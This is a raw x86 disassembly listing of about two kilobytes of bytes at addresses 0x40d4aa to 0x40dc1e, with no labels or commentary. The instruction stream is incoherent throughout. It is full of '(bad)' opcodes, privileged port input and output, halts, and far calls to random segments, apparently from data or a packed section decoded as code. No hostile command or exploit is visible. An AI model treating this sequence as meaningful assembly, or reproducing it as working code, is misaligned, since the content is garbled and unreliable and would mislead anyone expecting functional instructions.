  40d4aa:	xchg   esi,eax
  40d4ab:	xor    BYTE PTR [ecx+0x1b],0x95
  40d4af:	dec    esp
  40d4b0:	jg     0x40d4eb
  40d4b2:	or     edi,edi
  40d4b4:	inc    edx
  40d4b5:	mov    ds:0xb353ffa,eax
  40d4ba:	cmp    eax,0x4729e701
  40d4bf:	mov    al,ds:0xa897a84a
  40d4c4:	add    ebp,edx
  40d4c6:	mov    ds:0x6ca0cbd6,al
  40d4cb:	or     al,0xc3
  40d4cd:	test   eax,0x18c4a7bb
  40d4d2:	pop    es
  40d4d3:	jo     0x40d543
  40d4d5:	jmp    0xa391ca33
  40d4da:	pop    ecx
  40d4db:	out    0xbd,al
  40d4dd:	cs inc ebx
  40d4df:	or     eax,0x4f07f925
  40d4e4:	hlt    
  40d4e5:	jo     0x40d505
  40d4e7:	ja     0x40d4e4
  40d4e9:	iret   
  40d4ea:	jecxz  0x40d553
  40d4ec:	lock aas 
  40d4ee:	jno    0x40d56b
  40d4f0:	mov    al,0x62
  40d4f2:	add    eax,0x7887f909
  40d4f7:	push   esi
  40d4f8:	jle    0x40d577
  40d4fa:	fwait
  40d4fb:	nop
  40d4fc:	mov    dh,0xd0
  40d4fe:	or     DWORD PTR [ecx],ecx
  40d500:	sub    BYTE PTR [edi+0x757be1a4],dh
  40d506:	out    dx,eax
  40d507:	test   ecx,ebp
  40d509:	ins    BYTE PTR es:[edi],dx
  40d50a:	stos   BYTE PTR es:[edi],al
  40d50b:	push   esp
  40d50c:	mov    ds:0x4ac9c51f,eax
  40d511:	jg     0x40d560
  40d513:	aad    0x17
  40d515:	inc    esp
  40d516:	inc    ecx
  40d517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d518:	push   ds
  40d519:	inc    edi
  40d51a:	jecxz  0x40d53a
  40d51c:	jl     0x40d549
  40d51e:	rcl    esi,1
  40d520:	add    al,0x47
  40d522:	xor    eax,0x547a9e20
  40d527:	nop
  40d528:	add    ch,0x4
  40d52b:	mov    ecx,0x1e9883c5
  40d530:	hlt    
  40d531:	mov    al,0x4
  40d533:	xor    DWORD PTR [edx-0x36],edx
  40d536:	xor    DWORD PTR [edi],0xcf7b173e
  40d53c:	jp     0x40d59d
  40d53e:	sahf   
  40d53f:	stc    
  40d540:	test   edi,esp
  40d542:	jge    0x40d5ba
  40d544:	push   ebx
  40d545:	cmp    edi,DWORD PTR [ecx+ebp*4+0x5]
  40d549:	lock pop ebx
  40d54b:	mov    ds:0xb98a2710,al
  40d550:	jns    0x40d555
  40d552:	les    ecx,FWORD PTR [ecx]
  40d554:	call   0xde25467
  40d559:	shl    esi,cl
  40d55b:	fild   DWORD PTR ds:0x9f3e159e
  40d561:	mov    esp,0xbc43dcea
  40d566:	dec    eax
  40d567:	enter  0x552a,0xda
  40d56b:	mov    ds:0x66996f5,eax
  40d570:	adc    ch,BYTE PTR [edi-0x47f12633]
  40d576:	inc    DWORD PTR [ebp-0x80]
  40d579:	inc    edx
  40d57a:	gs xchg ebp,eax
  40d57c:	inc    edx
  40d57d:	jl     0x40d561
  40d57f:	ds cmp al,0xa7
  40d582:	cmp    BYTE PTR [ebp-0x4d],ch
  40d585:	outs   dx,DWORD PTR ds:[esi]
  40d586:	sahf   
  40d587:	scas   al,BYTE PTR es:[edi]
  40d588:	int    0x5f
  40d58a:	shr    BYTE PTR [edx],1
  40d58c:	sbb    al,BYTE PTR [ebp-0x3f]
  40d58f:	pop    eax
  40d590:	cmp    ax,0x59b8
  40d594:	add    al,0x83
  40d596:	inc    edx
  40d597:	mov    edi,0x515416e8
  40d59c:	or     eax,0x49381e14
  40d5a1:	push   cs
  40d5a2:	mov    cl,0x41
  40d5a4:	mov    esi,0xe3ee615d
  40d5a9:	and    ch,BYTE PTR [eax]
  40d5ab:	inc    ebp
  40d5ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5ad:	enter  0x6596,0xaa
  40d5b1:	idiv   BYTE PTR [ecx]
  40d5b3:	dec    eax
  40d5b4:	enter  0xe87d,0xfb
  40d5b8:	dec    ebx
  40d5b9:	mov    dl,0xd2
  40d5bb:	arpl   dx,dx
  40d5bd:	jbe    0x40d5e6
  40d5bf:	push   ebp
  40d5c0:	cmc    
  40d5c1:	inc    eax
  40d5c2:	ds push eax
  40d5c4:	or     ah,ch
  40d5c6:	cmp    al,0x57
  40d5c8:	push   eax
  40d5c9:	xchg   ebp,eax
  40d5ca:	mov    bl,0xcc
  40d5cc:	xchg   ebp,eax
  40d5cd:	mov    eax,ds:0x537a0cfc
  40d5d2:	je     0x40d5ff
  40d5d4:	out    dx,eax
  40d5d5:	mov    DWORD PTR [edx-0x49118aa4],edi
  40d5db:	ficom  WORD PTR [edi+0x262fa235]
  40d5e1:	cld    
  40d5e2:	jp     0x40d58e
  40d5e4:	test   DWORD PTR [edi+ecx*8],ecx
  40d5e7:	sbb    bl,bh
  40d5e9:	addr16 out dx,al
  40d5eb:	inc    edi
  40d5ec:	iret   
  40d5ed:	int3   
  40d5ee:	cmp    eax,0x536ebfff
  40d5f3:	sbb    DWORD PTR [ebp-0x25],edx
  40d5f6:	mov    eax,ds:0xc73b9e26
  40d5fb:	jmp    0x40d612
  40d5fd:	mov    ecx,0xc610ccaa
  40d602:	cld    
  40d603:	or     bh,BYTE PTR [ebp+ecx*4+0x5b]
  40d607:	(bad)  
  40d608:	sahf   
  40d609:	push   edx
  40d60a:	int    0x2d
  40d60c:	mov    al,0x8c
  40d60e:	xchg   edi,eax
  40d60f:	inc    eax
  40d610:	mov    dl,0x10
  40d612:	(bad)  
  40d613:	push   ebx
  40d614:	xchg   ebp,eax
  40d615:	and    ch,BYTE PTR [eax-0x6e7cb114]
  40d61b:	mov    edi,0x7afe32d3
  40d620:	push   ss
  40d621:	xchg   edi,eax
  40d622:	xor    eax,0x2eb2724d
  40d627:	mov    esi,0x44c0b03d
  40d62c:	mov    esp,0x1c35ea21
  40d631:	mov    ds:0x3e0b0f9d,al
  40d636:	test   BYTE PTR [eax+0x10],ch
  40d639:	xchg   ecx,eax
  40d63a:	push   0x3
  40d63c:	lods   al,BYTE PTR ds:[esi]
  40d63d:	lea    edx,[ebx+ebx*1]
  40d640:	or     al,0x96
  40d642:	or     cl,bh
  40d644:	pop    esi
  40d645:	(bad)  
  40d646:	out    dx,eax
  40d647:	in     eax,0x9d
  40d649:	dec    esp
  40d64a:	int    0xb
  40d64c:	xlat   BYTE PTR ds:[ebx]
  40d64d:	mov    al,ds:0xba12cbb4
  40d652:	and    DWORD PTR [edx-0x72490293],esp
  40d658:	jns    0x40d63c
  40d65a:	enter  0x3e58,0x26
  40d65e:	xchg   esp,ebx
  40d660:	add    DWORD PTR [edx-0x29],0x127dd8fc
  40d667:	rcl    BYTE PTR ds:0x7bbf9cb7,0x75
  40d66e:	mov    bh,0xa3
  40d670:	jo     0x40d6b2
  40d672:	pop    eax
  40d673:	inc    esp
  40d674:	mov    dh,0x2a
  40d676:	sub    BYTE PTR [edx+ecx*2],dl
  40d679:	das    
  40d67a:	shl    BYTE PTR [ebx+edx*1],0xdf
  40d67e:	pop    eax
  40d67f:	sbb    DWORD PTR [edi+0x721b0a2],eax
  40d685:	call   0xd650e3df
  40d68a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d68b:	or     BYTE PTR [edx],ch
  40d68d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d68e:	sub    ah,0x91
  40d691:	ds iret 
  40d693:	xchg   esp,eax
  40d694:	jge    0x40d626
  40d696:	hlt    
  40d697:	sub    BYTE PTR [ecx+eax*1+0x648de6b6],ah
  40d69e:	or     DWORD PTR [ecx+0x46836067],esi
  40d6a4:	repz cmp cl,BYTE PTR ds:0x12a0296
  40d6ab:	mov    esp,0x92569b89
  40d6b0:	inc    ecx
  40d6b1:	fadd   DWORD PTR [ebx-0x64]
  40d6b4:	mov    DWORD PTR [eax],esp
  40d6b6:	test   BYTE PTR cs:[edi+ebx*1-0x341e8add],dh
  40d6be:	sbb    eax,0x91f4a8c1
  40d6c3:	pusha  
  40d6c4:	mov    dl,0x5e
  40d6c6:	mov    ebx,0x80090772
  40d6cb:	push   edi
  40d6cc:	xchg   esi,eax
  40d6cd:	pushf  
  40d6ce:	xor    al,BYTE PTR [ecx]
  40d6d0:	cmc    
  40d6d1:	jae    0x40d716
  40d6d3:	into   
  40d6d4:	cli    
  40d6d5:	in     eax,0x44
  40d6d7:	sub    al,0xe4
  40d6d9:	push   0x1c
  40d6db:	lds    ecx,FWORD PTR [edx]
  40d6dd:	dec    esp
  40d6de:	inc    ebp
  40d6df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6e0:	and    al,0x79
  40d6e2:	in     al,dx
  40d6e3:	push   esi
  40d6e4:	dec    edi
  40d6e5:	sbb    edx,eax
  40d6e7:	mov    dh,0xad
  40d6e9:	sbb    BYTE PTR [ebp-0x42],al
  40d6ec:	pop    esi
  40d6ed:	mov    esi,0x94a22136
  40d6f2:	addr16 cmp al,0x0
  40d6f5:	aaa    
  40d6f6:	rol    DWORD PTR [ebx],1
  40d6f8:	std    
  40d6f9:	mov    DWORD PTR [eax],ecx
  40d6fb:	imul   DWORD PTR [edi-0x75]
  40d6fe:	jne    0x40d75c
  40d700:	adc    ecx,eax
  40d702:	loop   0x40d6dd
  40d704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d705:	(bad)  
  40d707:	push   ds
  40d708:	cmp    DWORD PTR [ebx-0x3f],ebp
  40d70b:	add    edi,DWORD PTR ds:0xa6f1fdf8
  40d711:	stos   BYTE PTR es:[edi],al
  40d712:	and    al,BYTE PTR [edi-0x50320a28]
  40d718:	shl    DWORD PTR [ecx],1
  40d71a:	or     DWORD PTR [edi+0x1b],0xc8dcbdd1
  40d721:	mov    DWORD PTR [ebx+0x2a1b97d7],ebp
  40d727:	retf   0x2333
  40d72a:	sub    bl,BYTE PTR [eax-0x10c30c6e]
  40d730:	fldenv [ecx-0x39f90087]
  40d736:	out    dx,al
  40d737:	int    0x41
  40d739:	sti    
  40d73a:	sbb    BYTE PTR [ebp+0x7b],ah
  40d73d:	add    BYTE PTR [edx+esi*2-0x23f12785],0x5b
  40d745:	neg    DWORD PTR [eax-0x42c1b700]
  40d74b:	outs   dx,BYTE PTR ds:[esi]
  40d74c:	mov    edi,0x948f59c5
  40d751:	push   ecx
  40d752:	std    
  40d753:	test   eax,0x6f680882
  40d758:	inc    esi
  40d759:	das    
  40d75a:	addr16 xor eax,0xa2bd37cc
  40d760:	adc    dl,BYTE PTR [edx-0x509c19d7]
  40d766:	cmp    ah,BYTE PTR [ebx]
  40d768:	in     eax,dx
  40d769:	push   ebx
  40d76a:	pop    ebp
  40d76b:	(bad)  
  40d76c:	xor    dh,ch
  40d76e:	imul   esi,DWORD PTR [edi],0x40
  40d771:	out    dx,al
  40d772:	mov    bl,0x19
  40d774:	jns    0x40d7ec
  40d776:	scas   al,BYTE PTR es:[edi]
  40d777:	fdiv   DWORD PTR [ecx-0x50]
  40d77a:	gs xchg ebp,eax
  40d77c:	cli    
  40d77d:	popf   
  40d77e:	sbb    al,0xa3
  40d780:	dec    ecx
  40d781:	or     BYTE PTR cs:[eax-0xc8aff03],bh
  40d788:	mov    ecx,0x59e155f5
  40d78d:	inc    edx
  40d78e:	xor    dl,dh
  40d790:	xchg   edx,eax
  40d791:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d792:	sar    BYTE PTR [esi],cl
  40d794:	push   ds
  40d795:	imul   esi,eax,0x94cc21e
  40d79b:	fiadd  WORD PTR ds:0xf2ceed4e
  40d7a1:	mov    dl,0xa5
  40d7a3:	sbb    DWORD PTR [eax-0x66b5e0e2],ebp
  40d7a9:	loope  0x40d7e4
  40d7ab:	gs loop 0x40d7c5
  40d7ae:	xlat   BYTE PTR ss:[ebx]
  40d7b0:	pop    esp
  40d7b1:	jns    0x40d7a9
  40d7b3:	cli    
  40d7b4:	mov    ds:0xbfdacd55,eax
  40d7b9:	mov    fs,ebx
  40d7bb:	imul   edi,DWORD PTR ds:0x28223f70,0x43
  40d7c2:	or     eax,0x251528a1
  40d7c7:	fwait
  40d7c8:	or     eax,0x28227f7d
  40d7cd:	push   esp
  40d7ce:	cmp    eax,0xc7fe4750
  40d7d3:	adc    ebx,ebp
  40d7d5:	jp     0x40d7c8
  40d7d7:	xchg   esp,eax
  40d7d8:	cmp    ebp,ebp
  40d7da:	xlat   BYTE PTR ds:[ebx]
  40d7db:	jge    0x40d801
  40d7dd:	mov    BYTE PTR [ebp+0x540e9732],dl
  40d7e3:	imul   DWORD PTR [ebx-0x72]
  40d7e6:	popf   
  40d7e7:	xchg   ecx,eax
  40d7e8:	cmc    
  40d7e9:	add    ecx,DWORD PTR es:[edi-0x27]
  40d7ed:	ins    BYTE PTR es:[edi],dx
  40d7ee:	mov    bh,0x8b
  40d7f0:	popa   
  40d7f1:	stos   DWORD PTR es:[edi],eax
  40d7f2:	jbe    0x40d781
  40d7f4:	xchg   dl,bh
  40d7f6:	xor    BYTE PTR [edi],al
  40d7f8:	inc    edi
  40d7f9:	cmp    dl,BYTE PTR [esi]
  40d7fb:	cwde   
  40d7fc:	xor    BYTE PTR [eax-0x5d],dh
  40d7ff:	sbb    DWORD PTR [ebp+eax*2-0x6b635c0d],0x54ae98b5
  40d80a:	ins    DWORD PTR es:[edi],dx
  40d80b:	aam    0x37
  40d80d:	(bad)  
  40d80e:	sub    BYTE PTR [esi-0x6d428b55],bl
  40d814:	ins    BYTE PTR es:[edi],dx
  40d815:	or     al,0x7c
  40d817:	or     al,0xa7
  40d819:	scas   eax,DWORD PTR es:[edi]
  40d81a:	add    DWORD PTR [edx],esp
  40d81c:	icebp  
  40d81d:	js     0x40d7d4
  40d81f:	adc    edx,edx
  40d821:	outs   dx,DWORD PTR ds:[esi]
  40d822:	fidiv  WORD PTR [esi-0x76]
  40d825:	push   es
  40d826:	or     dh,al
  40d828:	sub    BYTE PTR [edx-0x35a56991],ah
  40d82e:	and    ah,BYTE PTR [edi+edi*4]
  40d831:	mov    edx,0x4dff530c
  40d836:	xchg   ecx,eax
  40d837:	ja     0x40d882
  40d839:	dec    eax
  40d83a:	dec    esp
  40d83b:	push   edi
  40d83c:	shr    ebp,1
  40d83e:	mov    dl,0xd6
  40d840:	or     cl,BYTE PTR [eax+0x2e]
  40d843:	mov    cl,0x5c
  40d845:	ret    
  40d846:	xor    esi,DWORD PTR ds:0xf5bfab92
  40d84c:	int    0x70
  40d84e:	(bad)
  40d852:	and    al,0x46
  40d854:	mov    ebx,cs
  40d856:	xchg   edi,eax
  40d857:	outs   dx,BYTE PTR ds:[esi]
  40d858:	outs   dx,BYTE PTR ds:[esi]
  40d859:	dec    ebp
  40d85a:	test   DWORD PTR [ecx+0x1a],edx
  40d85d:	mov    edi,DWORD PTR [edx]
  40d85f:	inc    ebp
  40d860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d861:	rcr    cl,1
  40d863:	push   ss
  40d864:	lock mov ah,0x6b
  40d867:	cmp    BYTE PTR [eax+0x512fc1e0],bh
  40d86d:	shl    DWORD PTR [ecx],1
  40d86f:	call   0x196c:0x54a305d9
  40d876:	mov    al,ds:0x6be68d18
  40d87b:	in     al,0x5f
  40d87d:	mov    bl,0x4
  40d87f:	(bad)  
  40d881:	or     ebx,DWORD PTR [ebp+0x76d6b040]
  40d887:	sbb    ecx,0x4e
  40d88a:	adc    eax,0xcc7d7963
  40d88f:	sub    BYTE PTR [ebx+0x7de450f9],bh
  40d895:	ror    eax,cl
  40d897:	push   ebp
  40d898:	or     DWORD PTR [ebx-0x2fc3fe0c],esp
  40d89e:	cmp    ch,BYTE PTR [eax*8+0x35e11b79]
  40d8a5:	xor    ah,dl
  40d8a7:	shr    BYTE PTR [edi],cl
  40d8a9:	rcr    DWORD PTR [ecx],cl
  40d8ab:	mov    ch,0xf6
  40d8ad:	mov    bh,0x69
  40d8af:	mov    bh,0x12
  40d8b1:	rcr    BYTE PTR [edi+0x727fbab3],cl
  40d8b7:	outs   dx,DWORD PTR ds:[esi]
  40d8b8:	inc    ebp
  40d8b9:	push   edx
  40d8ba:	mov    bl,0xeb
  40d8bc:	mov    ds:0x2757ac21,al
  40d8c1:	or     BYTE PTR [esp+ebx*8-0x696f97f6],bl
  40d8c8:	push   edx
  40d8c9:	or     al,al
  40d8cb:	push   ebp
  40d8cc:	nop
  40d8cd:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8cf:	frstor [edx]
  40d8d1:	mov    cs,WORD PTR [eax-0x612b15fd]
  40d8d7:	loopne 0x40d873
  40d8d9:	add    eax,0x621190b3
  40d8de:	sahf   
  40d8df:	daa    
  40d8e0:	push   ds
  40d8e1:	ins    DWORD PTR es:[edi],dx
  40d8e2:	arpl   WORD PTR [ebx],di
  40d8e4:	cmp    eax,0xa4e7c454
  40d8e9:	jo     0x40d929
  40d8eb:	cmp    BYTE PTR [esi-0x29],dl
  40d8ee:	xchg   ebp,eax
  40d8ef:	xchg   BYTE PTR [eax-0x70],al
  40d8f2:	jmp    0x40d96f
  40d8f4:	mov    esp,0x665f80a0
  40d8f9:	dec    ebp
  40d8fa:	jmpw   0xacac
  40d8fe:	lods   al,BYTE PTR ds:[esi]
  40d8ff:	adc    esi,DWORD PTR [edi-0x6afb4d26]
  40d905:	add    ebp,edi
  40d907:	sub    ecx,DWORD PTR [ecx+0x40]
  40d90a:	adc    bl,dh
  40d90c:	sti    
  40d90d:	add    al,0x7f
  40d90f:	jne    0x40d8a3
  40d911:	mov    ebp,0x6a6e4618
  40d916:	pushf  
  40d917:	adc    DWORD PTR [ecx+0x50],esi
  40d91a:	push   0x50c850a9
  40d91f:	mov    al,ds:0x46bf9169
  40d924:	jp     0x40d964
  40d926:	cmp    DWORD PTR [ecx-0x3ad54c83],esp
  40d92c:	(bad)  
  40d92d:	out    0x74,al
  40d92f:	xchg   esi,eax
  40d930:	idiv   BYTE PTR [edi-0x6f51562b]
  40d936:	jp     0x40d8da
  40d938:	rcl    DWORD PTR [esi+0x44289a0c],cl
  40d93e:	adc    dl,BYTE PTR [edi+0x10]
  40d941:	hlt    
  40d942:	inc    ecx
  40d943:	jmp    0x1f4583e7
  40d948:	push   0x12115bde
  40d94d:	aas    
  40d94e:	add    DWORD PTR [edx+0xb26d609],0xffffffc2
  40d955:	cmp    edx,DWORD PTR [ebp-0x6a8b8248]
  40d95b:	xor    dl,BYTE PTR [eax]
  40d95d:	loope  0x40d975
  40d95f:	in     eax,0xe8
  40d961:	rcr    BYTE PTR [eax+edi*8-0x1b],1
  40d965:	(bad)  
  40d966:	test   DWORD PTR [ebx],esi
  40d968:	jns    0x40d99a
  40d96a:	inc    ecx
  40d96b:	sub    DWORD PTR [edx],0xf02a3513
  40d971:	and    esi,edi
  40d973:	inc    edx
  40d974:	sbb    ebp,DWORD PTR [edi]
  40d976:	mov    ah,0x9b
  40d978:	fisttp DWORD PTR [edx-0x42]
  40d97b:	lds    eax,FWORD PTR [edi]
  40d97d:	es scas eax,DWORD PTR es:[edi]
  40d97f:	stos   DWORD PTR es:[edi],eax
  40d980:	sbb    bl,dh
  40d982:	cmp    eax,0x67166b74
  40d987:	sti    
  40d988:	jno    0x40da02
  40d98a:	pop    ds
  40d98b:	pop    ebx
  40d98c:	(bad)  
  40d98e:	cs retf 
  40d990:	xchg   ebx,eax
  40d991:	add    BYTE PTR [ebp+0x26],ch
  40d994:	adc    eax,0x8010d2f4
  40d999:	gs pop edi
  40d99b:	test   eax,0xbbd56ba3
  40d9a0:	adc    eax,0x80e72ef8
  40d9a5:	pushf  
  40d9a6:	out    dx,al
  40d9a7:	in     eax,0x98
  40d9a9:	scas   al,BYTE PTR es:[edi]
  40d9aa:	fmul   DWORD PTR [edx-0x5e2ad378]
  40d9b0:	dec    ebx
  40d9b1:	rcl    DWORD PTR [ecx+eax*2-0x61cc8192],cl
  40d9b8:	lds    ebx,FWORD PTR [ebx+0x6f560d99]
  40d9be:	ins    BYTE PTR es:[edi],dx
  40d9bf:	jp     0x40d9f6
  40d9c1:	stos   DWORD PTR es:[edi],eax
  40d9c2:	mov    ah,0xe1
  40d9c4:	jnp    0x40d9b6
  40d9c6:	mov    esi,0x853fba69
  40d9cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9cc:	inc    ebx
  40d9cd:	ins    DWORD PTR es:[edi],dx
  40d9ce:	and    eax,0xf989cfbb
  40d9d3:	fwait
  40d9d4:	mov    al,0x2a
  40d9d6:	mov    ebx,DWORD PTR [edi-0x63]
  40d9d9:	jbe    0x40d99d
  40d9db:	inc    esi
  40d9dc:	fldcw  WORD PTR [edx]
  40d9de:	loop   0x40d98d
  40d9e0:	inc    esi
  40d9e1:	imul   ecx,DWORD PTR [ebx+ebx*4-0x38],0x68
  40d9e6:	pop    ebp
  40d9e7:	add    edi,DWORD PTR [edi]
  40d9e9:	loopne 0x40d97e
  40d9eb:	test   al,0xbc
  40d9ed:	pop    esp
  40d9ee:	imul   BYTE PTR [ebx]
  40d9f0:	jae    0x40d99d
  40d9f2:	leave  
  40d9f3:	data16 outs dx,BYTE PTR ds:[esi]
  40d9f5:	fs cli 
  40d9f7:	out    dx,eax
  40d9f8:	and    al,0x69
  40d9fa:	enter  0x634c,0x63
  40d9fe:	stos   BYTE PTR es:[edi],al
  40d9ff:	lods   eax,DWORD PTR ds:[esi]
  40da00:	popf   
  40da01:	call   0xa17d:0x90d7aa85
  40da08:	mov    esp,0xfc0910de
  40da0d:	(bad)  
  40da0e:	jnp    0x40d997
  40da10:	popf   
  40da11:	add    ebx,DWORD PTR [ecx-0x1a]
  40da14:	adc    ebp,DWORD PTR [ecx-0x15]
  40da17:	ins    BYTE PTR es:[edi],dx
  40da18:	imul   edx,DWORD PTR fs:[ebx+ecx*4+0x6f],0x826e9463
  40da21:	outs   dx,DWORD PTR ds:[esi]
  40da22:	cmp    al,0xa6
  40da24:	dec    eax
  40da25:	and    al,0x93
  40da27:	mov    ebx,0xbc3ff95d
  40da2c:	pop    esi
  40da2d:	mov    cl,0xd6
  40da2f:	add    BYTE PTR [edi-0x694764d3],cl
  40da35:	and    al,0x84
  40da37:	mov    ebx,0x814126bb
  40da3c:	outs   dx,DWORD PTR ds:[esi]
  40da3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da3e:	push   ds
  40da3f:	retf   
  40da40:	shl    DWORD PTR ds:0xef9d2d48,cl
  40da46:	xchg   edi,eax
  40da47:	in     eax,dx
  40da48:	xor    bl,BYTE PTR [edi]
  40da4a:	call   0xd3a8:0x22bf16ce
  40da51:	test   eax,0x25acff6c
  40da56:	xchg   DWORD PTR [edx+0x4c],edx
  40da59:	loope  0x40da61
  40da5b:	push   ebx
  40da5c:	or     eax,0xc2788e2
  40da61:	(bad)  
  40da62:	out    dx,eax
  40da63:	daa    
  40da64:	pop    ds
  40da65:	test   DWORD PTR [esi+0x4da1a942],esi
  40da6b:	test   BYTE PTR [ebx+eax*8-0x51],ch
  40da6f:	clc    
  40da70:	popf   
  40da71:	push   esp
  40da72:	fdiv   QWORD PTR [esi+eiz*1]
  40da75:	call   0xaada:0xc62a96dc
  40da7c:	xor    BYTE PTR [edx+0xc828c3d],ah
  40da82:	aaa    
  40da83:	or     al,0x4b
  40da85:	inc    ebx
  40da86:	adc    al,0x62
  40da88:	retf   0xb783
  40da8b:	push   ss
  40da8c:	and    eax,0xbf3ca859
  40da91:	shl    DWORD PTR [edi],cl
  40da93:	dec    esp
  40da94:	in     eax,dx
  40da95:	and    eax,0x614a28b2
  40da9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da9c:	xchg   ebx,eax
  40da9d:	js     0x40db01
  40da9f:	dec    esi
  40daa0:	mov    esi,ebp
  40daa2:	fucomp st(3)
  40daa4:	mov    al,0x97
  40daa6:	aaa    
  40daa7:	jns    0x40da97
  40daa9:	repnz fisubr DWORD PTR [ecx]
  40daac:	jnp    0x40dad3
  40daae:	jno    0x40da32
  40dab0:	pop    esi
  40dab1:	mov    ecx,0xa841a40
  40dab6:	inc    ecx
  40dab7:	mov    bh,0xa0
  40dab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40daba:	mov    ebx,0x4db046a5
  40dabf:	out    dx,eax
  40dac0:	call   0xe12f9cfb
  40dac5:	test   eax,0x867ca1e5
  40daca:	aad    0xe5
  40dacc:	dec    ebp
  40dacd:	ins    BYTE PTR es:[edi],dx
  40dace:	pop    edx
  40dacf:	jb     0x40db50
  40dad1:	into   
  40dad2:	out    0x96,eax
  40dad4:	ins    DWORD PTR es:[edi],dx
  40dad5:	out    0xe4,al
  40dad7:	mov    ?,WORD PTR [esi-0x62]
  40dada:	jge    0x40da9a
  40dadc:	fcomp  QWORD PTR [eax]
  40dade:	cmp    al,0x78
  40dae0:	shl    ecx,1
  40dae2:	fidiv  WORD PTR [ecx-0x38]
  40dae5:	dec    DWORD PTR [edi]
  40dae7:	shl    BYTE PTR [ebx-0x7e95c1c3],cl
  40daed:	outs   dx,BYTE PTR ds:[esi]
  40daee:	xchg   edx,eax
  40daef:	or     esp,eax
  40daf1:	(bad)  
  40daf2:	(bad)  
  40daf3:	add    eax,0x3b1797e
  40daf8:	cli    
  40daf9:	into   
  40dafa:	cmc    
  40dafb:	ret    
  40dafc:	and    eax,0x68c39c20
  40db01:	ffree  st(7)
  40db03:	sbb    edx,DWORD PTR [ebx]
  40db05:	int    0xa0
  40db07:	enter  0xc2a4,0x7b
  40db0b:	cmp    edi,edi
  40db0d:	clc    
  40db0e:	enter  0x444a,0x12
  40db12:	bnd jns 0x40db1a
  40db15:	inc    esp
  40db16:	mov    eax,0xd1a4781e
  40db1b:	or     BYTE PTR [eax],al
  40db1d:	lea    ebx,[ebp+0x11053492]
  40db23:	push   esi
  40db24:	test   eax,0xbfc5dd0b
  40db29:	mov    edx,0xc6435b03
  40db2e:	(bad)  
  40db2f:	mov    edx,0x10468d4f
  40db34:	imul   esp,DWORD PTR [ecx],0x6190e3d7
  40db3a:	(bad)  [eax+0x15082913]
  40db40:	inc    edx
  40db41:	rol    ch,cl
  40db43:	cmp    eax,0x60e30a25
  40db48:	dec    esp
  40db49:	cmp    eax,esp
  40db4b:	inc    edx
  40db4c:	sbb    al,0xad
  40db4e:	add    eax,0xfcabe6fd
  40db53:	push   edx
  40db54:	mov    edi,0xddbfbf83
  40db59:	adc    dh,bh
  40db5b:	add    esp,DWORD PTR [ebx+0x27e85cd4]
  40db61:	lea    esp,[ecx+0x33]
  40db64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db65:	out    dx,eax
  40db66:	test   eax,0xff588498
  40db6b:	and    BYTE PTR [ebx-0x70ab3e15],dh
  40db71:	data16 adc BYTE PTR [ebx+0x1f],0xdd
  40db76:	cmc    
  40db77:	inc    edi
  40db78:	iret   
  40db79:	adc    dl,BYTE PTR [esp+eiz*2+0x5b1bc7ab]
  40db80:	dec    ecx
  40db81:	xchg   ebx,eax
  40db82:	test   DWORD PTR [eax+0x6b],eax
  40db85:	mov    dh,0x66
  40db87:	add    eax,0x78229e25
  40db8c:	inc    ecx
  40db8d:	pop    eax
  40db8e:	mov    ch,BYTE PTR [esi+0x2]
  40db91:	ret    0x353
  40db94:	inc    ebp
  40db95:	outs   dx,BYTE PTR ds:[esi]
  40db96:	in     eax,0xee
  40db98:	call   0x94a8:0x51062e3d
  40db9f:	addr16 adc al,0x47
  40dba2:	jo     0x40db2b
  40dba4:	push   ecx
  40dba5:	and    ebx,ebp
  40dba7:	cli    
  40dba8:	std    
  40dba9:	jmp    0xd28c:0x2fac9f58
  40dbb0:	inc    eax
  40dbb1:	adc    ecx,DWORD PTR [eax+0x4f]
  40dbb4:	hlt    
  40dbb5:	scas   al,BYTE PTR es:[edi]
  40dbb6:	inc    ebx
  40dbb7:	rol    BYTE PTR [esi+0x43],cl
  40dbba:	cmp    al,BYTE PTR [edx+0x6f54307e]
  40dbc0:	cld    
  40dbc1:	push   ebp
  40dbc2:	push   ebp
  40dbc3:	mov    DWORD PTR [ebx],esi
  40dbc5:	inc    esi
  40dbc6:	sub    dl,BYTE PTR [ebx-0x26c0480e]
  40dbcc:	jl     0x40db74
  40dbce:	jbe    0x40dbd9
  40dbd0:	mov    dl,0x4b
  40dbd2:	push   cs
  40dbd3:	cmp    bh,BYTE PTR [ebx-0x119591fe]
  40dbd9:	dec    eax
  40dbda:	inc    esi
  40dbdb:	dec    ecx
  40dbdc:	jmp    0xa55e:0x4d6fe920
  40dbe3:	call   0x7128:0xd09d3d89
  40dbea:	loope  0x40db9b
  40dbec:	push   edx
  40dbed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbee:	push   ecx
  40dbef:	gs daa 
  40dbf1:	xchg   esi,eax
  40dbf2:	in     al,0x69
  40dbf4:	(bad)  
  40dbf5:	sar    bh,1
  40dbf7:	push   ebx
  40dbf8:	sbb    edx,esi
  40dbfa:	lock popf 
  40dbfc:	out    dx,eax
  40dbfd:	mov    bh,0xe4
  40dbff:	lea    eax,[eax+0x1d]
  40dc02:	test   al,0xd7
  40dc04:	fucomp st(4)
  40dc06:	loope  0x40dc29
  40dc08:	and    BYTE PTR [edx-0x34ad9eba],bl
  40dc0e:	hlt    
  40dc0f:	in     al,0x1e
  40dc11:	aaa    
  40dc12:	jno    0x40dc13
  40dc14:	lea    eax,[ecx]
  40dc16:	and    eax,0x9014a661
  40dc1b:	ficomp DWORD PTR [edi-0x1d]
  40dc1e:	pop    edx
